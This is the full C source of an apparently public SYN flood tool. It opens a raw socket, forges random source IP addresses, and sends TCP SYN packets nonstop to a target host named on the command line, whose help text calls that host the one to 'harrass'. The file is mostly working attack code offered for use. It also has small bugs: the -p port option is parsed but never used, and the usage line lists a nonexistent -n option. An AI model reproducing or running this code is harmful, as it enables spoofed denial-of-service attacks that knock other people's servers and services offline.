// basics
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>

// network stuff
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>

// signal handling
#include <signal.h> 

// timing
#include <time.h>

// different flavors of IP header
#ifdef __APPLE__
typedef struct ip iph_t;
#else
typedef struct iphdr iph_t; 
#endif

// make sure we're sending lots of packets
#define OVERFLOW_USLEEP_MAX (500000)    // 0.5s
#define OVERFLOW_USLEEP_MIN (1000)      // 1ms
#define OVERFLOW_RATE_MAX   (0.01)      // 1%
#define OVERFLOW_RATE_MIN   (0.001)     // 0.1%

// calculate header checksum
unsigned short csum (unsigned short *ptr, int nbytes);

// list of bad source address ranges
#define BLACKLIST_SIZE 6
struct iprange {
    uint32_t from;
    uint32_t to;
};

struct iprange * make_blacklist (void);

// get an IP address for a hostname
in_addr_t getip (char *hostname);

// get a random IP address
in_addr_t randip (struct iprange *blacklist);

// obtain and configure a socket
int get_socket (void);

// threading stuff
uint64_t synflood (in_addr_t dst_addr, unsigned short port);

// handle a termination signal
void onsignal (int sig);

// print instructions
void print_usage (FILE *fout, char *execname);

// print title / info
void print_title (void);

// parse / validate command line arguments
void parse_argv(int argc, char **argv, char **hostname, unsigned short *port);


//
// global variables. such design
//

volatile int stop;      // flag to terminate program
int q;                  // quiet mode


/**
 * main function
 */
int main (int argc, char **argv)
{   

    char *hostname = NULL;
    unsigned short port = 80;
    q = 0;

    parse_argv (argc, argv, &hostname, &port);

    if (!q) {
        print_title ();
        printf ("target: %s:%d\n", hostname, port);   
    }

    // lookup destination address
    in_addr_t dst_addr = getip (hostname);

    // exit signals
    stop = 0;
    signal (SIGINT, onsignal);
    signal (SIGTERM, onsignal);

    // start the timer
    time_t tstart = time (NULL);

    //
    // run
    //
    uint64_t count = synflood (dst_addr, port);

    // wait for signal

    // just do time in seconds. 
    // not too accurate...
    time_t exec_time = time (NULL) - tstart;
    if (exec_time == 0) {
        exec_time = 1;
    }
    uint64_t packets_per_sec = count / exec_time;

#ifdef __APPLE__ 
    // mac: complains if not formatted as unsigned long long 
    #define LLU_FMT "%llu"
#else
    // linux: complains if not formatted long unsigned
    #define LLU_FMT "%lu"
#endif
    
    if (!q) {
        // print number of sent packets and packets per second
        printf ("sent " LLU_FMT " packets (" LLU_FMT " packets / second)\n",
                count, 
                packets_per_sec);
    }
}


/**
 * print basic usage instructions
 */
void print_usage (FILE *fout, char *execname) {
    fprintf (fout, "usage: %s -h hostname [-p port] [-n nthreads]\n", execname);
}


/**
 * print pretty title
 */
void print_title (void) {
    printf (
        " _____              __ _                 _   \n"
        "/  ___|            / _| |               | |  \n"
        "\\ `--. _   _ _ __ | |_| | ___   ___   __| |  \n"
        " `--. \\ | | | '_ \\|  _| |/ _ \\ / _ \\ / _` |  \n"
        "/\\__/ / |_| | | | | | | | (_) | (_) | (_| |  \n"
        "\\____/ \\__, |_| |_|_| |_|\\___/ \\___/ \\__,_|  \n"
        "        __/ |                                \n"
        "       |___/                                 \n"
        "\n"
        "version 0.2.0 | https://github.com/kevin-albert/synflood\n\n"
    );
}


/**
 * parse / validate command line arguments
 */
void parse_argv (int argc, char **argv, char **hostname, unsigned short *port) {
    int c;
    while ( (c = getopt(argc, argv, "h:p:q?")) != -1 ) {
        switch (c) {
            case 'h':
                *hostname = optarg;
                break;
            case 'p':
                *port = atoi (optarg);
                if (*port == 0) {
                    fprintf (stderr, "invalid port - " 
                             "must be between 1 and 65535\n");
                    exit (EXIT_FAILURE);
                }
                break;
            case 'q':
                q = 1;
                break;
            case '?':
                print_usage (stdout, argv[0]); 
                printf ("\n"
                        "options: \n"
                        "  -h  hostname     the hostname / ip address to "
                                           "harrass\n"
                        "  -p  port         the port to connect to. "
                                           "defaults to 80.\n"
                        "  -q  quiet        don't print anything.\n"
                       );
                break;
            default:
                print_usage (stderr, argv[0]);
                exit (EXIT_FAILURE);
        }
    }

    if (*hostname == NULL) {
        print_usage (stderr, argv[0]);
        exit (EXIT_FAILURE);
    }
}


/**
 * initialize list of invalid source IP ranges
 */
struct iprange * make_blacklist (void) {
    #define BLACKLIST(a0,b0,c0,d0, a1,b1,c1,d1) \
        blacklist[i].from = ((a0 << 24)|(b0 << 16)|(c0 << 8)|d0);\
        blacklist[i++].to = ((a1 << 24)|(b1 << 16)|(c1 << 8)|d1)

    struct iprange * blacklist = malloc (BLACKLIST_SIZE * 
                                         sizeof (struct iprange));

    int i = 0;
    BLACKLIST(  0,  0,  0,  0,    0,255,255,255);
    BLACKLIST(127,  0,  0,  0,  127,255,255,255);
    BLACKLIST(192,  0,  0,  0,  192,255,255,255);
    BLACKLIST(198, 51,100,  0,  198, 51,100,255);
    BLACKLIST(203,  0,113,  0,  203,  0,113,255);
    BLACKLIST(239,  0,  0,  0,  255,255,255,255);
    return blacklist;
} 



/**
 * open a raw socket
 */
int get_socket (void) {
     //Create a raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s == -1) {
        if (!q) {
            if (errno == EPERM) {
                fprintf (stderr, "cannot open raw socket as non root user\n");
            } else {
                perror ("unable to open socket");
            }
        }
        
        exit (1);
    }
    
    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        perror ("error setting IP_HDRINCL");
        exit (1);
    }

    return s;
}


//needed for checksum calculation
struct checksum_header
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
     
    struct tcphdr tcp;
};


/**
 * calculate checksum from some arbitrary string of bytes
 */
unsigned short csum (unsigned short *ptr,int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}


/**
 * get an IP address for a hostname
 */
in_addr_t getip (char *hostname) {

    if (!q) {
        printf("getting ip address... ");
        fflush (stdout);
    }
    struct hostent *he;
    struct in_addr **addr_list;

    if ( (he = gethostbyname (hostname)) ) {
        // DNS lookup success!
        addr_list = (struct in_addr**) he->h_addr_list;
        if (addr_list[0]) {
            if (!q) {
                printf ("address for %s: %s\n", 
                        hostname, 
                        inet_ntoa (*addr_list[0]));
            }
            return addr_list[0]->s_addr;
        } else {
            // lookup succeeded but 0 IP addresses?
            if (!q) {
                fprintf (stderr, "no ip address for %s\n", hostname);
            }
        }
    } else {
        // lookup failed
        if (!q) {
            fprintf (stderr, "dns lookup failed for %s\n", hostname);
        }
    }

    exit (1);
}


/**
 * generate a random IPV4 address
 */
in_addr_t randip (struct iprange *blacklist) {
    char data[16];
    
    int r;

    try_addr: 
    r = rand();
    for (int i = 0; i < BLACKLIST_SIZE; ++i) {
        if (r >= blacklist[i].from && r <= blacklist[i].to) {
            goto try_addr;
        }
    }

    return htonl(r);
}


/**
 * execute the attack in a thread
 * each thread gets a socket, but reuses the SYN packet
 * returns the number of packets successfully sent
 */
uint64_t synflood (in_addr_t dst_addr, unsigned short port) {

    // don't use these source addresses
    struct iprange *blacklist = make_blacklist ();

    int s = get_socket ();
    uint64_t count = 0;
    uint64_t buf_err_count = 0;
    uint64_t retry_count = 10;
    int sleep_usec = 10000;

    struct sockaddr_in addr;
    char datagram[4096];
    size_t ip_len;
    short seq = 0;

    srand (time (NULL));

    while (!stop) {

        // spoof source ip
        in_addr_t source_ip = randip (blacklist);

        //IP header
        iph_t *iph = (iph_t *) datagram;

        //TCP header
        struct tcphdr *tcph = (struct tcphdr *) 
                              (datagram + sizeof (struct ip));
        struct checksum_header csh;
        
        addr.sin_family = AF_INET;
        addr.sin_port = htons (80);

        addr.sin_addr.s_addr = dst_addr;
        memset (datagram, 0, 4096);
         
        //IP Header
#ifdef __APPLE__
        iph->ip_hl = 5;
        iph->ip_v = 4;
        iph->ip_tos = 0;
        iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);
        iph->ip_id = htons(++seq);      // random packet id
        iph->ip_off = 0;
        iph->ip_ttl = 255;
        iph->ip_p = IPPROTO_TCP;
        iph->ip_sum = 0;                // set to 0 before calculating checksum
        iph->ip_src.s_addr = source_ip;
        iph->ip_dst.s_addr = addr.sin_addr.s_addr;
         
        iph->ip_sum = csum ((unsigned short *) datagram, 
                            iph->ip_len >> 1);
#else
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
        iph->id = htons(++seq);         // random packet id
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;                 // set to 0 before calculating checksum
        iph->saddr = source_ip;
        iph->daddr = addr.sin_addr.s_addr;
         
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
#endif
         
        //TCP Header
#ifdef __APPLE__
        tcph->th_sport = htons (++seq); // random source port
        tcph->th_dport = htons (80);
        tcph->th_seq = 0;
        tcph->th_ack = 0x0;
        tcph->th_x2 = 0x0;
        tcph->th_off = 5;               // first and only tcp segment
        tcph->th_flags = TH_SYN;        // SYN
        tcph->th_win = htons (65535);   // max window size
        tcph->th_sum = 0x0;             // IP stack fills this in
        tcph->th_urp = 0x0;
#else 
        tcph->source = htons (++seq);   // random source port
        tcph->dest = htons (80);
        tcph->seq = 0;
        tcph->ack_seq = 0;
        tcph->doff = 5;                 // first and only tcp segment
        tcph->fin=0;
        tcph->syn=1;                    // SYN
        tcph->rst=0;
        tcph->psh=0;
        tcph->ack=0;
        tcph->urg=0;
        tcph->window = htons (65535);   // max window size
        tcph->check = 0;                // IP stack fills this in
        tcph->urg_ptr = 0;
#endif
         
        // IP checksum
        csh.source_address = source_ip;
        csh.dest_address = addr.sin_addr.s_addr;
        csh.placeholder = 0;
        csh.protocol = IPPROTO_TCP;
        csh.tcp_length = htons(20);
        memcpy(&csh.tcp , tcph , sizeof *tcph);

        iph->
#ifdef __APPLE__
        ip_sum
#else
        check
#endif
         = csum( (unsigned short*) &csh , sizeof csh);

        // set ip_len
        ip_len = iph->
#ifdef __APPLE__
        ip_len;
#else
        tot_len;   
#endif

        if (sendto (s,                  // socket 
                    datagram,
                    ip_len,             // total length of datagram
                    0,                  // routing flags
                    (struct sockaddr *) &addr, 
                    sizeof (addr)) < 0)
        {
            if (errno == ENOBUFS) {
                // ran out of buffer
                // wait a little and retry
                ++buf_err_count;

                if (count > 0) {
                    // also, try to adjust sleep_usec so we don't have to sleep
                    // as often
                    double buf_err_rate = (double) buf_err_count / count;
                    if (buf_err_rate > OVERFLOW_RATE_MAX && 
                          sleep_usec < OVERFLOW_USLEEP_MAX) {
                        sleep_usec *= 2.5;
                        if (!q) {
                            printf ("frequent buffer overflow - "
                                    "chilling out more\n");
                        }
                    }
                }

                usleep (sleep_usec);
            } else if (errno == EADDRNOTAVAIL) {
                // this means we generated an invalid source IP
                // report it so it can be blacklisted
                struct in_addr source_addr;
                source_addr.s_addr = source_ip;
                if (!q) {
                    fprintf(stderr, 
                            "error: source address %s is invalid\n", 
                            inet_ntoa (source_addr));
                }
            } else {
                if (retry_count-- <= 0) {
                    if (!q) {
                        perror ("sendto() failed");
                    }
                    break;
                }
            }
        } else {
            // success - reset retry_count and increment count
            retry_count = 0;
            ++count;   

            if (count % 100000 == 0) {
                // see if we can decrease our sleep window
                double buf_err_rate = (double) buf_err_count / count;
                if (buf_err_rate < OVERFLOW_RATE_MIN && 
                      sleep_usec > OVERFLOW_USLEEP_MIN) {
                    sleep_usec /= 2.5;
                    if (!q) {
                        printf ("infrequent buffer overflow - "
                                "chilling out less\n");
                    }
                }
            }
        }
    }

    return count;
}


/**
 * executed when a termination signal is received. sets the stop flag so that 
 * threads know its time to shut down
 */
void onsignal (int sig) {
    if (!q) {
        printf ("shutting down\n");
    }
    stop = 1;   // tells running threads to stop
}

